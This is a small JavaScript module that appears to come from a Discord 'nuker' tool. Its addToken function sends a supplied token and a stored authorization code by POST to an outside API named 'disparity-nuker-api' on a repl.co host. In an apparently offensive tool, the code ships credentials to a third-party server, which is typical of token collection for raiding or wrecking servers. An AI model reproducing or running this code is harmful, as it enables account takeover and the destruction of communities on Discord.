import request from "request";
import db from "../../../database/db";

export default function addToken(client, rl, token) {
  return new Promise((resolve, reject) => {
    request(
      {
        url: "https://disparity-nuker-api.0w218021.repl.co/addtoken",
        method: "POST",
        json: {
          Authorization: db.get("auth-code"),
          Token: token,
        },
      },
      (err, res, body) => {
        if (res.body.status === true) resolve(void 0);
        if (res.body.status == false) reject(db.get("auth-code"));
      }
    );
  });
}
